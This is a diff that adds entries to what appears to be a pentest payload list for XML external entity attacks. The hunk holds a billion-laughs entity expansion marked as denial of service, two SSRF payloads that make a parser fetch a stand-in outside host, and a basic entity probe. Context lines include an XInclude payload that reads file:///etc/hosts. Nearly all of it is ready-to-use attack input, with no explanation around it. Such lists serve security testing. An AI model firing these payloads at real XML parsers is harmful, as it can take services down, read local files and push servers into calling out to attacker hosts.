@@ -60,3 +60,51 @@ C:/Windows/win.ini
 ### --- XInclude --- ###
 ### ---  --- --- --- ###
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hosts"/></foo>
+
+
+### ---  --- --- ###
+### --- DOS ---  ###
+### ---  --- --- ###
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY a0 "dos" >
+<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+<!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
+<!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
+<!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
+<!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
+<!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
+<!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
+]>
+<data>&a10;</data>
+
+
+### ---  --- --- ###
+### --- SSRF --- ###
+### ---  --- --- ###
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "https://domain_collab" >
+]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "https://domain_collab" >
+]>
+<foo>&xxe;</foo>
+
+
+### ---  --- ---  ###
+### --- BASIC --- ###
+### ---  --- ---  ###
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE replace [<!ENTITY basicXXE "CrimsonXXE"> ]>
+ <creds>
+  <username>&basicXXE;</username>
+ </creds>
